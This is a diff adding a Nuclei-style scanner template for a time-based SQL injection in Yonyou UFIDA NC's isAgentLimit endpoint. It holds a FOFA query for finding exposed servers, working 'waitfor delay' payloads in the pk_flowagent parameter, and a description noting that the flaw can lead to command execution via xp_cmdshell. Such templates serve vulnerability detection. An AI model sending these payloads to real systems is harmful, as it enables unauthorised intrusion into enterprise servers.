@@ -1,0 +1,35 @@
+id: yongyouNC-isAgentLimit-sql-injection
+
+info:
+  name: 用友NC oacoSchedulerEvents/isAgentLimit SQL注入漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: app="用友-UFIDA-NC"
+    用友NC /portal/pt/oacoSchedulerEvents/isAgentimit接口中的pk_fowagent参数存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshel可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247484340&idx=1&sn=a349d85feb4a05a1996f5d8a88d54958&chksm=c267b687f5103f91b9f77f7d872589688c6ed28e94fd7765018b999dd9503421377e05e724f0&token=1619136955&lang=zh_CN#rd
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        GET /portal/pt/oacoSchedulerEvents/isAgentLimit?pageId=login&pk_flowagent=1'waitfor+delay+'0:0:5'-- HTTP/1.1 
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+      - |
+        GET /portal/pt/oacoSchedulerEvents/isAgentLimit?pageId=login&pk_flowagent=1'waitfor+delay+'0:0:8'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and  
+      - type: status
+        status: 
+          - 200
